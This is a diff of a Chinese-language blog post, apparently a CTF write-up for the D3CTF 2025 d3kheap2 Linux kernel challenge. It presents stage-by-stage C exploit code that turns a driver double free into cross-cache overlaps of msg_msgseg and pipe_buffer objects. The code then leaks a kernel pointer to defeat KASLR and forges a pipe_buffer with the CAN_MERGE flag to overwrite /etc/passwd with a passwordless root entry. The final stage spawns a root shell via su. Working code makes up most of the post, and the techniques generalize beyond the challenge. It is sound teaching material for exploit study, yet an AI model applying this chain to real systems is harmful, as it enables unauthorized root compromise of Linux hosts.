+    用户空间->>管道子系统: pipe创建128个管道对
+    用户空间->>消息队列子系统: msgget创建2048个普通消息队列
+    用户空间->>消息队列子系统: msgget创建32个特殊消息队列
+```
+
+### 6-3. 第二阶段：初始堆喷布局
+
+第二阶段执行精密的初始堆喷，为后续的漏洞触发建立精确的内存布局。
+
+**核心代码实现**：
+
+```c
+static void initial_heap_spraying(void) {
+    // 向所有队列发送第一波消息（通过write_msg分配kmalloc-4k）
+    for (int i = 0; i < MSG_QUEUE_NUM; i++) {
+        write_msg(msqid[i], &first_msg_data, sizeof(first_msg_data), FIRST_MSG_TYPE);
+    }
+
+    // 堆喷驱动程序对象以填充kmalloc-2k slab
+    for (int i = 0; i < CHUNK_SPRAY_COUNT; i++) {
+        add_chunk(i);
+    }
+
+    // 释放所有驱动程序对象以创建堆空洞
+    for (int i = 0; i < CHUNK_SPRAY_COUNT; i++) {
+        delete_chunk(i);
+    }
+}
+```
+
+**内存布局技术特点**：
+
+1. **消息大小优化**：
+    - `FIRST_MSG_SIZE`设置为`0x1000 - sizeof(struct msg_msg)`，确保分配在kmalloc-4k缓存中
+    - 精确控制消息大小实现更可控的内存分配
+
+2. **堆喷策略优化**：
+    - 先进行消息队列堆喷，建立内存基线
+    - 然后进行d3kheap2对象堆喷，填充特定区域
+    - 立即释放创建精确的内存空洞模式
+
+    这种顺序操作创建了更可预测的内存状态。
+
+3. **时序控制增强**：
+    - 操作之间几乎没有延迟
+    - 快速连续执行，减少其他内核活动的干扰
+
+```mermaid
+flowchart TD
+    A[开始堆布局] --> B[发送2048个第一波消息]
+    B --> C[分配256个d3kheap2对象]
+    C --> D[立即释放所有d3kheap2对象]
+    D --> E[内存布局准备完成]
+
+    B --> B1[write_msg触发kmalloc-4k分配]
+    C --> C1[add_chunk分配kmalloc-2k对象]
+    D --> D1[delete_chunk释放对象创建空洞]
+```
+
+### 6-4. 第三阶段：触发驱动程序双重释放
+
+第三阶段触发驱动程序的双重释放漏洞，并通过精心设计的消息操作在kmalloc-2k缓存中分配`msg_msgseg`结构。
+
+**核心代码实现**：
+
+```c
+static void trigger_double_free(void) {
+    // 处理前一半消息队列：释放消息并发送更大的消息
+    for (int i = 0; i < MSG_QUEUE_NUM / 2; i++) {
+        read_msg(msqid[i], &first_msg_data, sizeof(first_msg_data), FIRST_MSG_TYPE);
+
+        // 准备带有标识标记的伪造消息
+        size_t *fake_msg = (size_t *)&second_msg_data.mtext[FIRST_MSG_SIZE];
+        fake_msg[0] = *(size_t *)"BinRacer";
+        fake_msg[1] = i;
+        fake_msg[2] = *(size_t *)"BinRacer";
+
+        // write_msg: 分配更大的第二波消息（kmalloc-4k + msg_msgseg）
+        write_msg(msqid[i], &second_msg_data, sizeof(second_msg_data), SECOND_MSG_TYPE);
+    }
+
+    // 释放驱动程序对象（第二次释放 - 触发双重释放）
+    for (int i = 0; i < CHUNK_SPRAY_COUNT; i++) {
+        delete_chunk(i);
+    }
+
+    // 处理后一半消息队列：发送更大的消息
+    for (int i = MSG_QUEUE_NUM / 2; i < MSG_QUEUE_NUM; i++) {
+        size_t *fake_msg = (size_t *)&second_msg_data.mtext[FIRST_MSG_SIZE];
+        fake_msg[0] = *(size_t *)"BinRacer";
+        fake_msg[1] = i;
+        fake_msg[2] = *(size_t *)"BinRacer";
+
+        write_msg(msqid[i], &second_msg_data, sizeof(second_msg_data), SECOND_MSG_TYPE);
+    }
+}
+```
+
+**关键技术细节**：
+
+1. **复合消息的精确分配机制**：
+    - `write_msg`触发两个关键的内存分配：
+        - `kmalloc-4k`：用于存储消息的主要部分
+        - `kmalloc-2k`：用于存储`msg_msgseg`结构（2048字节）
+    - 关键点：`msg_msgseg`分配在kmalloc-2k缓存中，会占用前面释放的d3kheap2对象的空洞
+
+2. **消息分割策略**：
+    - 前一半消息队列：先释放第一波消息，再发送第二波消息
+    - 后一半消息队列：直接发送第二波消息
+
+    这种策略创建了交替的内存分配模式，增加了`msg_msgseg`分配到目标kmalloc-2k空洞的概率。
+
+3. **双重释放时机**：
+    - 在发送了前一半队列的第二波消息后，立即触发d3kheap2对象的双重释放
+    - 这样，后一半队列的`msg_msgseg`可能分配到刚刚被双重释放的kmalloc-2k内存区域
+    - 结果：多个`msg_msgseg`结构可能相互重叠
+
+```mermaid
+sequenceDiagram
+    participant 用户空间
+    participant 消息队列子系统
+    participant d3kheap2驱动
+    participant Slab分配器
+
+    Note over 用户空间,Slab分配器: 第一步: 处理前一半消息队列(0-1023)
+
+    loop 1024个消息队列
+        用户空间->>消息队列子系统: read_msg释放第一波消息
+        用户空间->>消息队列子系统: write_msg发送第二波消息
+    end
+
+    Note over 用户空间,Slab分配器: 第二步: 触发双重释放
+
+    用户空间->>d3kheap2驱动: delete_chunk触发双重释放
+
+    Note over 用户空间,Slab分配器: 第三步: 处理后一半消息队列(1024-2047)
+
+    loop 1024个消息队列
+        用户空间->>消息队列子系统: write_msg发送第二波消息
+    end
+
+    Note over Slab分配器: msg_msgseg分配到双重释放的kmalloc-2k空洞
+```
+
+### 6-5. 第四阶段：检测堆污染
+
+第四阶段检测双重释放导致的内存污染，验证`msg_msgseg`重叠状态。
+
+**核心代码实现**：
+
+```c
+static int detect_heap_corruption(void) {
+    for (int i = 0; i < MSG_QUEUE_NUM; i++) {
+        // peek_msg: 读取消息而不移除它
+        peek_msg(msqid[i], &second_msg_data, sizeof(second_msg_data), 0);
+
+        // 检查损坏标记
+        size_t *leak_data = (size_t *)&second_msg_data.mtext[FIRST_MSG_SIZE];
+        if (leak_data[1] != i) {  // 队列索引不匹配表示损坏
+            victim_qid = i;
+            overlap_qid = leak_data[1];
+            return 0;
+        }
+    }
+
+    return -1;
+}
+```
+
+**检测技术特点**：
+
+1. **非侵入式检测**：
+    - 使用`peek_msg`系统调用读取消息而不移除消息
+    - 避免改变内存状态，这是检测技术的重要优化
+
+2. **索引验证机制**：
+    - 每个消息的`msg_msgseg`部分包含队列索引
+    - 正常情况下，读取的索引应与队列ID匹配
+    - 不匹配表明内存被污染
+
+3. **数据完整性检查**：
+    - 通过魔术字"BinRacer"验证数据完整性
+    - 减少误报，提高检测准确性
+
+**执行流程描述**：
+
+1. 遍历所有2048个消息队列
+2. 对每个队列使用`peek_msg`读取第二波消息（不删除）
+3. 从消息的`msg_msgseg`部分提取队列索引
+4. 如果读取到的索引与队列ID不匹配，表示内存被污染
+5. 记录受害者队列ID和重叠队列ID
+
+### 6-6. 第五阶段：管道缓冲区堆布局优化
+
+第五阶段执行管道缓冲区堆布局优化，通过释放消息和调整管道大小来操控堆布局，最终检测管道重叠。
+
+**核心代码实现**：
+
+```c
+static void pipe_heap_fengshui(void) {
+    // 释放受害者消息以创建kmalloc-2k空洞
+    read_msg(msqid[victim_qid], &second_msg_data, sizeof(second_msg_data), SECOND_MSG_TYPE);
+
+    // 调整偶数索引管道的大小以占据空洞
+    for (int i = 0; i < MAX_PIPE_COUNT; i += 2) {
+        resize_pipe_buffer(i, PIPE_BUFFER_SIZE);
+    }
+
+    // 释放重叠队列消息以创建第二个kmalloc-2k空洞
+    read_msg(msqid[overlap_qid], &second_msg_data, sizeof(second_msg_data), SECOND_MSG_TYPE);
+
+    // 调整奇数索引管道的大小以占据第二个空洞
+    for (int i = 1; i < MAX_PIPE_COUNT; i += 2) {
+        resize_pipe_buffer(i, PIPE_BUFFER_SIZE);
+    }
+
+    // 向所有管道写入索引值用于检测
+    for (size_t i = 0; i < MAX_PIPE_COUNT; i++) {
+        write(pipe_fds[i][1], &i, sizeof(i));
+    }
+
+    // 通过读取索引值检测管道重叠
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        size_t idx = 0;
+        read(pipe_fds[i][0], &idx, sizeof(idx));
+
+        if (i != idx) {  // 索引不匹配表示重叠
+            victim_pipe_idx = i;
+            overlap_pipe_idx = idx;
+            break;
+        }
+    }
+}
+```
+
+**关键步骤说明**：
+
+1. **释放消息创建空洞**：
+    - 通过`read_msg`释放受害者消息，在kmalloc-2k缓存中创建空洞
+    - 通过`read_msg`释放重叠队列的消息，创建第二个kmalloc-2k空洞
+
+2. **调整管道大小**：
+    - 通过`resize_pipe_buffer`触发内核为管道重新分配缓冲区
+    - 管道缓冲区的管理结构`pipe_buffer`会分配在kmalloc-2k缓存中
+    - 调整偶数索引管道大小，占据第一个空洞
+    - 调整奇数索引管道大小，占据第二个空洞
+
+3. **重叠检测**：
+    - 每个管道写入自己的索引
+    - 然后从每个管道读取索引
+    - 如果读取的索引与写入的不同，说明两个管道缓冲区发生了重叠
+    - 重叠表示它们共享了同一块内存
+
+**管道缓冲区结构布局**：
+
+```c
+/* offset      |    size */  type = struct pipe_buffer {
+/* 0x0000      |  0x0008 */    struct page *page;
+/* 0x0008      |  0x0004 */    unsigned int offset;
+/* 0x000c      |  0x0004 */    unsigned int len;
+/* 0x0010      |  0x0008 */    const struct pipe_buf_operations *ops;
+/* 0x0018      |  0x0004 */    unsigned int flags;
+/* XXX  4-byte hole      */
+/* 0x0020      |  0x0008 */    unsigned long private;
+
+                               /* total size (bytes):   40 */
+                             }
+```
+
+管道缓冲区结构大小为0x28字节，多个`pipe_buffer`结构通常一起分配在kmalloc-2k缓存中。
+
+### 6-7. 第六阶段：泄露内核地址
+
+第六阶段从重叠的管道缓冲区结构中提取内核地址，实现KASLR绕过。
+
+**核心代码实现**：
+
+```c
+static void leak_kernel_address(void) {
+    // 清理无关的管道
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        if (i == victim_pipe_idx || i == overlap_pipe_idx) continue;
+        close(pipe_fds[i][0]);
+        close(pipe_fds[i][1]);
+        create_pipe_pair(i);
+    }
+
+    // 关闭受害者管道
+    close(pipe_fds[victim_pipe_idx][0]);
+    close(pipe_fds[victim_pipe_idx][1]);
+
+    // 调整剩余管道的大小
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        if (i == victim_pipe_idx || i == overlap_pipe_idx) continue;
+        resize_pipe_buffer(i, PIPE_BUFFER_SIZE);
+    }
+
+    // 写入/读取以触发页面分配
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        if (i == victim_pipe_idx || i == overlap_pipe_idx) continue;
+        write(pipe_fds[i][1], pipe_data, 0x8);
+        read(pipe_fds[i][0], pipe_data, 0x8);
+    }
+
+    // 关闭重叠管道
+    close(pipe_fds[overlap_pipe_idx][0]);
+    close(pipe_fds[overlap_pipe_idx][1]);
+
+    // 堆喷特殊消息以捕获pipe_buffer数据
+    memset(&second_msg_data, 0, sizeof(second_msg_data));
+    for (int i = 0; i < EVIL_MSG_QUEUE_NUM; i++) {
+        write_msg(evil_msqid[i], &second_msg_data, sizeof(second_msg_data), SECOND_MSG_TYPE);
+    }
+
+    // 将/etc/passwd数据拼接到管道中
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        if (i == victim_pipe_idx || i == overlap_pipe_idx) continue;
+        off_t offset = 0;
+        splice(victim_fd, &offset, pipe_fds[i][1], NULL, 0x1000, 0);
+        write(pipe_fds[i][1], pipe_data, i);
+    }
+
+    // 在特殊消息中搜索pipe_buffer
+    for (int i = 0; i < EVIL_MSG_QUEUE_NUM; i++) {
+        peek_msg(evil_msqid[i], &second_msg_data, sizeof(second_msg_data), 0);
+
+        // pipe_buffer位于msg_msgseg的偏移0x20处
+        struct pipe_buffer *pipe_buf = (struct pipe_buffer*)&second_msg_data.mtext[FIRST_MSG_SIZE + 0x20];
+        victim_pipe_buf = pipe_buf[0];
+        fake_pipe_buf = pipe_buf[1];
+
+        // 检查是否找到有效的pipe_buffer
+        if (fake_pipe_buf.ops > kernel_base) {
+            evil_qid = i;
+            victim_pipe_idx = fake_pipe_buf.len;
+
+            // 从泄露的ops指针计算内核基址
+            kernel_offset = fake_pipe_buf.ops - ANON_PIPE_BUF_OPS;
+            kernel_base += kernel_offset;
+            return;
+        }
+    }
+}
+```
+
+**信息泄露技术特点**：
+
+1. **管道清理优化**：
+    - 清理无关管道，减少干扰
+    - 提高目标管道被正确识别的概率
+
+2. **特殊消息队列**：
+    - 使用专门的32个特殊消息队列进行最终的数据提取
+    - 与普通队列分离，提高可靠性
+
+3. **偏移定位精确**：
+    - 准确知道`pipe_buffer`结构位于`msg_msgseg`的偏移0x20处
+    - 这是通过精确计算得到的
+
+**KASLR绕过计算**：
+
+从泄露的`ops`指针可以精确计算内核偏移：
+
+```c
+kernel_offset = fake_pipe_buf.ops - ANON_PIPE_BUF_OPS;
+kernel_base += kernel_offset;
+```
+
+其中`ANON_PIPE_BUF_OPS`是匿名管道缓冲区操作结构的内核地址，是内核镜像中的一个静态符号。通过从泄露的`ops`指针减去这个已知偏移，可以计算出内核的随机化偏移，从而绕过KASLR。
+
+### 6-8. 第七阶段：触发Dirty Pipe
+
+第七阶段触发Dirty Pipe漏洞，通过修改管道缓冲区结构实现文件修改。
+
+**核心代码实现**：
+
+```c
+static void trigger_dirty_pipe(void) {
+    // 准备伪造的pipe_buffer结构
+    fake_pipe_buf.page = victim_pipe_buf.page;
+    fake_pipe_buf.offset = 0;
+    fake_pipe_buf.len = 0;
+    fake_pipe_buf.flags = 0x10;  // PIPE_BUF_FLAG_CAN_MERGE标志
+
+    // 读取包含pipe_buffer的特殊消息，释放kmalloc-2k的空洞
+    read_msg(evil_msqid[evil_qid], &second_msg_data, sizeof(second_msg_data), 0);
+
+    // 修改消息中的pipe_buffer
+    struct pipe_buffer *pipe_buf = (struct pipe_buffer *)&second_msg_data.mtext[FIRST_MSG_SIZE + 0x20];
+    pipe_buf[0] = fake_pipe_buf;
+    pipe_buf[1] = fake_pipe_buf;
+
+    // 将修改后的消息写回所有特殊队列，占用释放的kmalloc-2k的空洞
+    for (int i = 0; i < EVIL_MSG_QUEUE_NUM; i++) {
+        write_msg(evil_msqid[i], &second_msg_data, sizeof(second_msg_data), SECOND_MSG_TYPE);
+    }
+
+    // 通过写入损坏的管道触发Dirty Pipe
+    write(pipe_fds[victim_pipe_idx][1], evil_data, sizeof(evil_data));
+}
+```
+
+**漏洞触发机制特点**：
+
+1. **标志位精确设置**：
+    - `fake_pipe_buf.flags = 0x10`设置`PIPE_BUF_FLAG_CAN_MERGE`标志
+    - 这是Dirty Pipe漏洞的关键，允许直接写入页面缓存
+
+2. **双重结构写入**：
+    - 同时修改两个`pipe_buffer`结构
+    - 增加成功概率，如果第一个结构修改不成功，第二个可能成功
+
+3. **批量消息写入**：
+    - 向所有32个特殊消息队列写入修改后的消息
+    - 确保至少一个成功覆盖目标内存
+
+**Dirty Pipe漏洞原理**：
+
+Dirty Pipe漏洞（CVE-2022-0847）允许无特权的进程向任意文件写入数据，即使该文件是只读的。漏洞的核心在于`pipe_buffer`结构中的`PIPE_BUF_FLAG_CAN_MERGE`标志。当这个标志被设置时：
+
+1. 管道缓冲区可以直接引用文件的页面缓存
+2. 对管道的写入操作会直接修改页面缓存中的文件数据
+3. 绕过正常的文件权限检查
+
+**利用步骤详解**：
+
+1. **构造恶意pipe_buffer**：
+    - 使用泄露的页面指针
+    - 设置偏移为0，从文件开头开始写入
+    - 设置`PIPE_BUF_FLAG_CAN_MERGE`标志
+
+2. **替换内核中的pipe_buffer**：
+    - 读取包含原始pipe_buffer的特殊消息
+    - 修改消息中的pipe_buffer为恶意版本
+    - 将修改后的消息写回，覆盖内核中的pipe_buffer
+
+3. **触发漏洞**：
+    - 向目标管道写入恶意数据
+    - 由于设置了`PIPE_BUF_FLAG_CAN_MERGE`标志，写入会直接修改`/etc/passwd`文件的页面缓存
+    - 在`/etc/passwd`中添加无密码的root用户条目
+
+**恶意/etc/passwd条目**：
+
+```c
+static char evil_data[] = "root::0:0:root:/root:/bin/sh\n";
+```
+
+这个条目创建一个无密码的root用户，允许任意用户通过`su`命令获得root权限。
+
+### 6-9. 第八阶段：权限提升
+
+第八阶段尝试权限提升，通过修改后的`/etc/passwd`文件获取root权限。
+
+**核心代码实现**：
+
+```c
+static void escalate_privileges(void) {
+    system("su -c 'cat /root/flag' && su");
+}
+```
+
+**权限提升机制**：
+
+通过修改后的`/etc/passwd`文件，现在可以无密码以root用户身份登录。`system("su -c 'cat /root/flag' && su")`命令执行以下操作：
+
+1. 启动su程序
+2. su读取`/etc/passwd`，发现root用户无密码
+3. 允许无密码切换到root
+4. 执行`cat /root/flag`命令读取root标志
+5. 启动具有root权限的shell
+
+**预期结果**：
+
+- 如果利用成功，会看到`/root/flag`文件的内容
+- 然后会获得root shell提示符（`#`）
+- 可以执行任意root命令
+
+### 6-10. 技术总结
+
+d3kheap2第三个利用代码版本代表了该漏洞利用技术的最高水平，通过八个阶段的系统性操作实现了从环境建立到权限提升的完整技术链。整个过程展现了多子系统协调、跨缓存利用、精细堆控制、实时信息泄露和文件操作劫持等多种高级技术的系统集成，构建了从单一Double Free漏洞到完整权限提升的复杂技术链。相比前两个版本，这个版本在多个关键技术上有重大创新：创新的双重消息队列架构（2048个普通队列+32个特殊队列）提高了可靠性，通过`write_msg`分配包含`msg_msgseg`的复合消息设计实现了精确的内存重叠，其中`msg_msgseg`部分（2048字节）精确对应kmalloc-2k缓存，占用双重释放创建的kmalloc-2k空洞，采用交替管道分配策略优化了堆布局，通过专门的32个特殊消息队列提高了信息泄露效率，并实现了KASLR绕过。整个利用代码不仅功能完整，更在内核安全技术方面达到了新的高度，体现了现代漏洞利用工程的技术深度、精确性和系统化思维。
+
+### 6-11. 测试结果
+
+<div style="text-align: center; margin: 2rem 0;">
+  <img src="/images/posts/KernelExploit/CrossCacheDoubleFree/CrossCacheDoubleFree_003.png"
+       style="border-radius: 12px; 
+              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+              max-width: 100%;
+              height: auto;">
+</div>
+
 ## 参考
 
 - https://github.com/BinRacer/pwn4kernel/tree/master/src/CrossCacheDoubleFree2
 - https://github.com/BinRacer/pwn4kernel/tree/master/src/CrossCacheDoubleFree3
+- https://github.com/BinRacer/pwn4kernel/tree/master/src/CrossCacheDoubleFree4
 - https://arttnba3.cn/2025/06/04/CTF-0X0A_D3CTF2025_D3KHEAP2_D3KSHRM
